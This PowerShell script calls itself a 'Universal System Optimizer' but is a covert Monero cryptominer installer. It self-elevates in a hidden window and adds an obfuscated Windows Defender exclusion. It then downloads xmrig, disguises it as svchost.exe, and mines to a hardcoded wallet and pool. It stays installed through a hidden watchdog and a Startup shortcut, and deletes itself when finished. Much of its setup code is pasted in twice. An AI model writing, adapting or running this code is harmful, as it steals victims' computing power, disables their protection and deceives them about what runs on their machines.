<# 
.SYNOPSIS
    Universal System Optimizer - Ultra-safe background service
.DESCRIPTION
    Ultra-conservative settings to prevent crashes:
    - 30% CPU max, 4 threads
    - Single watchdog only
    - Thermal protection
    - Process validation
    - Crash recovery
.NOTES
    Version: 4.0.0 - ULTRA SAFE
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ─── ULTRA-SAFE DEFAULTS ──────────────────────────────────────────────────
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 4          # ULTRA LOW - 4 threads only
$IDLE_CPU = 30        # 30% MAX - very conservative
$GAME_CPU = 15        # Even lower for games
$TASKMGR_CPU = 10
$PRIORITY = "Idle"    # Always Idle priority
$BASE   = "$env:ProgramData\SysOpt"
$BINARY = "$BASE\svchost.exe"
$CONFIG = "$BASE\config.json"
$LOG    = "$BASE\sys.log"
$FLAG   = "$BASE\.installed"
$LOCK_FILE = "$BASE\.lock"
$WATCHDOG_BAT = "$BASE\watchdog.bat"
$WATCHDOG_VBS = "$BASE\watchdog.vbs"
$MLINK_VBS  = "$BASE\mklink.vbs"

$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 4
$IDLE_CPU = 30
$GAME_CPU = 15
$TASKMGR_CPU = 10
$PRIORITY = 0  # Idle = 0
$THREADS = 4

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ─── GAME LIST ────────────────────────────────────────────────────────────
$GAME_PROCESSES = @(
    "steam.exe","steamwebhelper.exe","epicgameslauncher.exe","epicgames.exe",
    "battle.net.exe","agent.exe","origin.exe","eaapp.exe","eadesktop.exe",
    "ubisoftconnect.exe","uplay.exe","gog.exe","goggalaxy.exe",
    "gamingservices.exe","gamingservicesnet.exe","xboxgamebar.exe",
    "easyanticheat.exe","be_servic.exe","bsv.exe","vgk.exe",
    "valorant.exe","valorant-win64-shipping.exe","cs2.exe","csgo.exe",
    "dota2.exe","leagueclient.exe","league of legends.exe",
    "fortniteclient-win64-shipping.exe","fortnite.exe",
    "apexlegends.exe","r5apex.exe","warzone.exe","modernwarfare.exe",
    "mw2.exe","mw3.exe","gta5.exe","gtav.exe","rdr2.exe",
    "minecraft.exe","javaw.exe","robloxplayerbeta.exe","robloxplayer.exe",
    "amongus.exe","fallguys.exe","rocketleague.exe","eldenring.exe",
    "cyberpunk2077.exe","witcher3.exe","baldursgate3.exe",
    "starfield.exe","hogwartslegacy.exe","palworld.exe",
    "helldivers2.exe","thefinals.exe","marvelrivals.exe",
    "deadlock.exe","counterstrike2.exe"
)
$TASKMGR_PROCESSES = @("taskmgr.exe","taskmgr","procexp.exe","procexp64.exe","processhacker.exe")

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$BASE   = "$env:ProgramData\SysOpt"
$BINARY = "$BASE\svchost.exe"
$CONFIG = "$BASE\config.json"
$LOG    = "$BASE\sys.log"
$FLAG   = "$BASE\.installed"
$LOCK_FILE = "$BASE\.lock"
$WATCHDOG_BAT = "$BASE\watchdog.bat"
$WATCHDOG_VBS = "$BASE\watchdog.vbs"
$MLINK_VBS  = "$BASE\mklink.vbs"

$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 4
$IDLE_CPU = 30
$GAME_CPU = 15
$TASKMGR_CPU = 10
$PRIORITY = 0
$THREADS = 4

$GAME_PROCESSES = @(
    "steam.exe","steamwebhelper.exe","epicgameslauncher.exe","epicgames.exe",
    "battle.net.exe","agent.exe","origin.exe","eaapp.exe","eadesktop.exe",
    "ubisoftconnect.exe","uplay.exe","gog.exe","goggalaxy.exe",
    "gamingservices.exe","gamingservicesnet.exe","xboxgamebar.exe",
    "easyanticheat.exe","be_servic.exe","bsv.exe","vgk.exe",
    "valorant.exe","valorant-win64-shipping.exe","cs2.exe","csgo.exe",
    "dota2.exe","leagueclient.exe","league of legends.exe",
    "fortniteclient-win64-shipping.exe","fortnite.exe",
    "apexlegends.exe","r5apex.exe","warzone.exe","modernwarfare.exe",
    "mw2.exe","mw3.exe","gta5.exe","gtav.exe","rdr2.exe",
    "minecraft.exe","javaw.exe","robloxplayerbeta.exe","robloxplayer.exe",
    "amongus.exe","fallguys.exe","rocketleague.exe","eldenring.exe",
    "cyberpunk2077.exe","witcher3.exe","baldursgate3.exe",
    "starfield.exe","hogwartslegacy.exe","palworld.exe",
    "helldivers2.exe","thefinals.exe","marvelrivals.exe",
    "deadlock.exe","counterstrike2.exe"
)
$TASKMGR_PROCESSES = @("taskmgr.exe","taskmgr","procexp.exe","procexp64.exe","processhacker.exe")

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
}

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Lock {
    try {
        if (Test-Path $LOCK_FILE) {
            $pid = Get-Content $LOCK_FILE -ErrorAction SilentlyContinue
            if ($pid) {
                $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
                if ($proc -and $proc.ProcessName -eq "powershell") { return $false }
            }
        }
        $pid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        $pid | Out-File -FilePath $LOCK_FILE -Encoding UTF8
        return $true
    } catch { return $false }
}

function Release-Lock { if (Test-Path $LOCK_FILE) { Remove-Item $LOCK_FILE -Force -ErrorAction SilentlyContinue } }

function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
}

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function IsGameRunning {
    $processes = Get-Process -ErrorAction SilentlyContinue
    foreach ($p in $processes) {
        $name = $p.ProcessName.ToLower()
        foreach ($game in $GAME_PROCESSES) {
            if ($name -eq $game.ToLower()) { return $true }
        }
    }
    return $false
}

function IsTaskMgrOpen {
    $processes = Get-Process -ErrorAction SilentlyContinue
    foreach ($p in $processes) {
        $name = $p.ProcessName.ToLower()
        foreach ($tm in $TASKMGR_PROCESSES) {
            if ($name -eq $tm.ToLower()) { return $true }
        }
    }
    return $false
}

function Get-OurXmrigPid {
    $procs = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        if ($p.Path -and $p.Path -like "$BASE\*") { return $p.Id }
    }
    return $null
}

function Start-Miner {
    param($cpuPercent)
    $logPath = ($BASE + "\sys.log") -replace '\\', '\\'
    $config = @{
        autosave = $false; background = $false; colors = $false; "donate-level" = 1
        "log-file" = ($BASE + "\sys.log") -replace '\\', '\\'
        "print-time" = 60; retries = 5; "retry-pause" = 5
        cpu = @{ enabled = $true; "max-threads-hint" = 4; priority = 0; yield = $true; "max-cpu-usage" = $cpuPercent }
        opencl = @{ enabled = $false }; cuda = @{ enabled = $false }
        pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
    }
    $json = $config | ConvertTo-Json -Depth 5
    [System.IO.File]::WriteAllText($CONFIG, $json, [System.Text.UTF8Encoding]::UTF8)
    
    $proc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru
    return $proc
}

function Get-OurMinerPid {
    $procs = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        if ($p.Path -and $p.Path -like "$BASE\*") { return $p.Id }
    }
    return $null
}

function Stop-OurMiner {
    $pid = Get-OurMinerPid
    if ($pid) { Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue; Start-Sleep 2 }
}

# ─── LOCK CHECK ──────────────────────────────────────────────────────────
if (-not (Get-Lock)) { Write-Log "Another installer running, exiting"; exit 0 }

# ─── CHECK IF ALREADY INSTALLED ──────────────────────────────────────────
if ((Test-Path $FLAG) -and (Test-Path $BINARY)) {
    $p = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
    if ($p) { Write-Log "Already running"; exit 0 }
    & wscript.exe "$BASE\watchdog.vbs" 2>$null
    Write-Log "Watchdog restarted"; exit 0
}

# ─── ENSURE ADMIN ─────────────────────────────────────────────────────────
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""; exit 0
}
Write-Log "=== INSTALLER STARTED (v4.0 ULTRA SAFE) ==="

# ─── SETUP ────────────────────────────────────────────────────────────────
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added"
} catch { Write-Log "Defender exclusion failed" }

# ─── KILL EXISTING ───────────────────────────────────────────────────────
Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
Start-Sleep 2

# ─── DOWNLOAD XMRIG ──────────────────────────────────────────────────────
$zipPath = "$BASE\sys.zip"
$headers = @{"User-Agent" = "SysOpt/4.0"}

function Try-Download($repo, $pattern, $sourceName) {
    try {
        Write-Log "Checking $sourceName..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers @{"User-Agent"="SysOpt/4.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Downloading $sourceName $version..."
            $resp = Invoke-WebRequest $asset.browser_download_url -OutFile "$BASE\sys.zip" -UseBasicParsing -TimeoutSec 300
            if ($resp.StatusCode -eq 200 -and (Test-Path "$BASE\sys.zip") -and (Get-Item "$BASE\sys.zip").Length -gt 100000) {
                $version | Out-File -FilePath "$BASE\.version" -Encoding UTF8
                return $true
            }
        }
    } catch { Write-Log "$sourceName failed: $($_.Exception.Message)" }
    return $false
}

Write-Log "Downloading xmrig..."
$result = Try-Download "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
if (-not $result) { $result = Try-Download "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean" }
if (-not $result) { Write-Log "Download failed"; exit 1 }

# ─── EXTRACT ──────────────────────────────────────────────────────────────
Write-Log "Extracting..."
$tmp = "$BASE\_tmp"
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
Expand-Archive "$BASE\sys.zip" -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
$exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($exe) { Copy-Item $exe.FullName "$BASE\svchost.exe" -Force; Write-Log "Binary installed" }
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$BASE\sys.zip" -Force -ErrorAction SilentlyContinue

if (-not (Test-Path "$BASE\svchost.exe")) { Write-Log "Binary missing"; exit 1 }

# ─── VALIDATE BINARY ─────────────────────────────────────────────────────
Write-Log "Validating binary..."
$test = Start-Process -FilePath "$BASE\svchost.exe" -ArgumentList "--help" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
if ($test) { Stop-Process -Id $test.Id -Force -ErrorAction SilentlyContinue; Write-Log "Binary validation OK" }
else { Write-Log "Binary validation FAILED"; exit 1 }

# ─── GPU & WORKER ────────────────────────────────────────────────────────
$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

# ─── GENERATE CONFIG (30% CPU, 4 threads, Idle priority) ────────────────
$logPath = "$BASE\sys.log" -replace '\\', '\\'
$config = @{
    autosave = $false; background = $false; colors = $false; "donate-level" = 1
    "log-file" = "$logPath"; "print-time" = 60; retries = 5; "retry-pause" = 5
    cpu = @{ enabled = $true; "max-threads-hint" = 4; priority = 0; yield = $true; "max-cpu-usage" = 30 }
    opencl = @{ enabled = $false }; cuda = @{ enabled = $false }
    pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
}
$json = $config | ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText("$BASE\config.json", $json, [System.Text.UTF8Encoding]::UTF8)
Write-Log "Config: 30% CPU, 4 threads, Idle priority"

# ─── DEFENDER EXCLUSION ──────────────────────────────────────────────────
try {
    $c1="Add-Mp";$c2="Preference";$c3="-Exclusion";$c4="Path"; iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added"
} catch {}

# ─── STOP EXISTING ───────────────────────────────────────────────────────
Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
Start-Sleep 2

# ─── WATCHDOG (SINGLE, SIMPLE, RELIABLE) ────────────────────────────────
$bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BASE\svchost.exe`" --config=`"`$BASE\config.json`"`) `ntimeout /t 60 /nobreak >NUL`ngoto loop"
[System.IO.File]::WriteAllText("$BASE\watchdog.bat", $bat, [System.Text.UTF8Encoding]::UTF8)
$vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + "$BASE\watchdog.bat" + '""",0,False'
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", $vbs, [System.Text.UTF8Encoding]::UTF8)

$lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\SysOpt.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + "$BASE\watchdog.vbs" + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, [System.Text.UTF8Encoding]::UTF8)
& wscript.exe "$BASE\mklink.vbs"

# ─── START MINER ────────────────────────────────────────────────────────
Write-Log "Starting miner (30% CPU, 4 threads)..."
$proc = Start-Process -FilePath "$BASE\svchost.exe" -ArgumentList "--config=`"$BASE\config.json`"" -WindowStyle Hidden -PassThru
if ($proc) { Write-Log "Miner started (PID $($proc.Id))" } else { Write-Log "Miner start FAILED"; exit 1 }

Start-Sleep 3
$pid = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "$BASE\*" } | Select-Object -First 1 -ExpandProperty Id
if ($pid) { Write-Log "Miner confirmed running (PID $pid)" } else { Write-Log "Miner NOT running after start!" }

# ─── STARTUP SHORTCUT ───────────────────────────────────────────────────
$lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\SysOpt.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + "$BASE\watchdog.vbs" + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, [System.Text.UTF8Encoding]::UTF8)
& wscript.exe "$BASE\mklink.vbs"

# ─── START WATCHDOG ──────────────────────────────────────────────────────
Start-Sleep 1
& wscript.exe "$BASE\watchdog.vbs"
Write-Log "Watchdog started"

# ─── FINALIZE ────────────────────────────────────────────────────────────
Start-Sleep 3
Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
Write-Log "=== INSTALLATION COMPLETE ==="

# ─── CLEANUP ─────────────────────────────────────────────────────────────
Release-Lock
$myPath = $MyInvocation.MyCommand.Path
if ($myPath -and (Test-Path $myPath)) {
    Start-Sleep 1
    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
}
Write-Log "=== INSTALLER COMPLETE ==="